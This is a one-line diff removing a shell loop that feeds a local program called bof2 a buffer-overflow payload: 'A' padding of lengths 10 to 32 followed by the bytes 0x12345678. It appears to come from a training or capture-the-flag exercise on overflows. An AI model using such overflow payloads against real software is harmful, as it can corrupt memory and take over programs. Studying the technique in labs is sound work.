@@ -1,1 +1,0 @@
-for i in {10..32}; do echo $i; python -c "print 'A'* $i + '\x78\x56\x34\x12'" | ./bof2 ; done
